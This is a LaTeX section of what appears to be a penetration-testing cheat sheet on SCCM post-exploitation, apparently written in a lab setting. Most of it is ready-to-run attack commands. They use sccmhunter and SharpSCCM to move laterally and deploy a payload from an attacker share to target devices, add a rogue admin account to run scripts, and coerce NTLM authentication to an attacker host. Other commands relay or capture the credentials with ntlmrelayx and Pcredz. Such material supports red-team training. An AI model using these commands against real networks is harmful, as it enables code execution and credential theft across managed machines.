\section{Post exploitation}


\subsection{AdminService lateral movement}
The \verb+CMPivot+ service, presents on the MP server, permits to enumerate all the resources (installed softwares, local administrators, hardware specification, and so on) of a computer, or a computer collection, and perform administrative tasks on them. It uses a HTTP REST API, named AdminService, provided by the SMS Provider server.

With SCCM administrative rights, it is possible to directly \verb+interact+ with the AdminService API, without using CMPivot, for post SCCM exploitation purpose.


{\bf Note:} sometimes \verb+sccmhunter.py+ retrieve an incorrect \verb+ResourceId+ for computer interaction, as alternative we can use \verb+SharpSCCM.exe+ to get the correct ResourceId. 

\begin{verbatim}
SharpSCCM.exe get devices -n SCCM-SMS -sms 172.50.0.40
\end{verbatim}


\begin{verbatim}
python3 sccmhunter.py admin -debug -u 'haas.local\jubeaz' -p jubeaz -ip bran.haas.local
\end{verbatim}

Then, the \verb+help+ command can be typed in the opened shell to view all the CMPivot commands handled by sccmhunter.

\href{https://github.com/garrettfoster13/sccmhunter/wiki/admin}{sccmhunter wiki} provide the list of all available commands

\begin{verbatim}
() C:\ >> help
() (C:\) >> interact 16777221
(16777221) (C:\) >> administrators
(16777221) (C:\) >> ls
\end{verbatim}


\subsection{Applications deployment}

{\bf Note}: This method may take a long time to work; if immediate access is required, it's recommended to use the Script Deployment method.

SharpSCCM can also help us enumerate and abuse SCCM infrastructure if we have access to an account with \verb+Full Administrator+ or \verb+Application Administrator+ rights on the Primary Server.

Deploying an application, involves:
\begin{itemize} 
    \item creating a collection of devices
    \item adding the target to this collection
    \item creating an application deployment linked to the collection
    \item and then executing this deployment. 
\end{itemize} 

It is possible to deploy an application as SYSTEM, as the primary user, or as the machine's currently logged user account.

By using a UNC path to specify the application to be deployed, it is possible to intercept NTLM authentication, opening the way to NTLM relay attacks and running an application on the machine. This method has the advantage of being more discreet than the installation and execution of a malicious payload.

\subsubsection{Enum}
\begin{verbatim}
# validate rights
SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p CollectionNames -p LogonName -p RoleNames -sms <sms_target>

# find victims
SharpSCCM.exe get primary-users -u blwasp -sms <sms_target>
SharpSCCM.exe get devices -w "Active=1 and Client=1" -sms <sms_target>
\end{verbatim}

\subsubsection{Create application}
\begin{verbatim}
SharpSCCM.exe new application -s -n HTB_application -p \\<l_ip>\share\test.exe -sms <sms_target>

SharpSCCM.exe new collection -n "new_collection" -t device -sms <sms_target> 

SharpSCCM.exe new collection-member -d SRV01 -n "new_collection" -t device -sms <sms_target>

SharpSCCM.exe new deployment -a HTB_application -c "new_collection" -sms <sms_target>

# try to speed up 
SharpSCCM.exe invoke update -n "new_collection" -sms <sms_target>
\end{verbatim}



\subsection{Script deployment}
As an SCCM administrator, In addition to applications, SCCM permits the deployment and execution of PowerShell scripts on any enrolled machines. 

{\bf Note}: by default, in an SCCM environment, an administrator cannot create and execute a script simultaneously. Therefore another account (user or computer) need to be compromised and promoted. 

using \verb+sccmhunter.py admin+ on SMS server
\begin{verbatim}
add_admin PWNED$ <account_sid>
\end{verbatim}

then relaunch \verb+sccmhunter.py admin+ with appouver:
\begin{verbatim}
python3 sccmhunter.py admin -u <user> -p <password> \
    -ip <sms_target> \
    -au 'JUBEAZ$' -ap 'Zaebuj12345+-' 

interact <ResourceID>
script ~/tmp/sccm/cmd.txt
\end{verbatim}


\subsection{Request and relay NTLM authentication}

In this final step you can chose to either create an actual application to deploy to the target machine or just trigger an install from a remote UNC path in order to capture and relay an incoming NTLM authentication. Note the following:
\begin{itemize}
    \item 
        Coercing an authentication might be stealthier (and requires less cleanup) than installing an application
    \item
        To capture and relay NTLM credentials, the target device must support NTLM (very likely).
    \item
        The neat part: The Authentication can be coerced using the primary user account of the device OR the device computer account (you can choose)
\end{itemize}

\begin{verbatim}
# Prep capturing server
## ntlmrelayx targeting 10.250.2.179
ntlmrelayx.py -smb2support -socks -ts -ip 10.250.2.100 -t 10.250.2.179

# Also keep Pcredz running, just in case
Pcredz -i enp0s8 -t
\end{verbatim}

Note that the incoming authentication requsts might take a while (couple minutes) to roll in...

\verb+SharpSCCM.exe exec+ execute a command, binary, or script on a client or request NTLM authentication from a client
\begin{verbatim}
SharpSCCM.exe exec -rid <TargetResourceID> -r <AttackerHost>
\end{verbatim}







